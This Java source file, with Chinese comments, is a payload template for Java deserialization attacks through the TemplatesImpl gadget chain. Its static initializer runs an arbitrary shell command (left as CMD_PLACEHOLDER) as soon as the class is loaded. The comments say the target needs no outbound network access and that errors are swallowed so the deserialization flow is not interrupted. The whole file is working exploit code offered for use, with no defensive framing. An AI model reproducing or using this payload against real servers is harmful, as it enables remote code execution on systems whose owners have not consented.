import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/**
 * TemplatesImpl 直打链模板：_outputProperties 触发 getOutputProperties ->
 * defineClass -> newInstance -> static 块执行命令。目标无需出网。
 */
public class TransletExec extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "CMD_PLACEHOLDER"});
        } catch (Exception e) {
            // 静默失败，避免中断反序列化流程
        }
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
}
